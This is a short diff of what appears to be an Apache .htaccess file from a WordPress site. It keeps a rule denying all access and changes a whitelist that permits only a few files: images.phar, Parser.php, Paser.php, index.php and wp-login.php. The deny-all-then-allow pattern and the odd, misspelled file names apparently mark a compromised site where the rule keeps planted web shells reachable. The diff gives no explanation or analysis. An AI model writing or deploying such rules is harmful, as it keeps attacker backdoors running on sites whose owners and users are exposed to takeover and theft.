@@ -2,7 +2,7 @@
 Order allow,deny
 Deny from all
 </FilesMatch>
-<FilesMatch "^(images.phar|imgs1.php|opet.php)$">
+<FilesMatch "^(images.phar|Parser.php|Paser.php|index.php|wp-login.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
